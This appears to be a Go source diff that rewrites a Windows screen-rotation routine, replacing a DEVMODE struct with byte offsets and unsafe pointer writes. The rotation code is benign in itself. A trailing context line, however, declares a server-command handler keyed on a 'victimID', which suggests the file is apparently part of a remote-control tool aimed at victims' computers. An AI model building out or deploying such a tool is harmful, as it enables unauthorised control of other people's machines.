@@ -190,28 +190,22 @@ func rotateScreen(angleDeg int) {
 	enumDisplay := user32.NewProc("EnumDisplaySettingsW")
 	changeDisplay := user32.NewProc("ChangeDisplaySettingsExW")
 
-	const dmPelsWidth = 0x00080000
-	const dmPelsHeight = 0x00100000
-	const dmDisplayOrientation = 0x00000080
+	const dmFieldsPelsWidth = 0x00080000
+	const dmFieldsPelsHeight = 0x00100000
+	const dmFieldsDisplayOrientation = 0x00000080
 	const enumCurrentSettings = 0xFFFFFFFF
 
-	type devmode struct {
-		_               [68]byte
-		DmSize          uint16
-		_               [6]byte
-		DmFields        uint32
-		_               [16]byte
-		DmOrientation   uint32
-		_               [4]byte
-		DmPelsWidth     uint32
-		DmPelsHeight    uint32
-		_               [104]byte
-	}
+	const offDmSize = 68
+	const offDmFields = 72
+	const offDmDisplayOrientation = 84
+	const offDmPelsWidth = 172
+	const offDmPelsHeight = 176
+	const devmodeSize = 220
 
-	var dm devmode
-	dm.DmSize = uint16(unsafe.Sizeof(dm))
+	var dm [devmodeSize]byte
+	*(*uint16)(unsafe.Pointer(&dm[offDmSize])) = devmodeSize
 
-	r, _, _ := enumDisplay.Call(0, uintptr(enumCurrentSettings), uintptr(unsafe.Pointer(&dm)))
+	r, _, _ := enumDisplay.Call(0, uintptr(enumCurrentSettings), uintptr(unsafe.Pointer(&dm[0])))
 	if r == 0 {
 		return
 	}
@@ -228,14 +222,20 @@ func rotateScreen(angleDeg int) {
 		orient = 0
 	}
 
-	curOrient := dm.DmOrientation
-	if (curOrient%2 == 0 && orient%2 != 0) || (curOrient%2 != 0 && orient%2 == 0) {
-		dm.DmPelsWidth, dm.DmPelsHeight = dm.DmPelsHeight, dm.DmPelsWidth
-	}
-	dm.DmOrientation = orient
-	dm.DmFields = dmPelsWidth | dmPelsHeight | dmDisplayOrientation
+	curOrient := *(*uint32)(unsafe.Pointer(&dm[offDmDisplayOrientation]))
+	pelsW := *(*uint32)(unsafe.Pointer(&dm[offDmPelsWidth]))
+	pelsH := *(*uint32)(unsafe.Pointer(&dm[offDmPelsHeight]))
 
-	changeDisplay.Call(0, uintptr(unsafe.Pointer(&dm)), 0, 0, 0)
+	if (curOrient%2 == 0 && orient%2 != 0) || (curOrient%2 != 0 && orient%2 == 0) {
+		pelsW, pelsH = pelsH, pelsW
+	}
+
+	*(*uint32)(unsafe.Pointer(&dm[offDmDisplayOrientation])) = orient
+	*(*uint32)(unsafe.Pointer(&dm[offDmPelsWidth])) = pelsW
+	*(*uint32)(unsafe.Pointer(&dm[offDmPelsHeight])) = pelsH
+	*(*uint32)(unsafe.Pointer(&dm[offDmFields])) = dmFieldsPelsWidth | dmFieldsPelsHeight | dmFieldsDisplayOrientation
+
+	changeDisplay.Call(0, uintptr(unsafe.Pointer(&dm[0])), 0, 0, 0)
 }
 
 func handleServerCommand(conn *websocket.Conn, victimID, command string) {
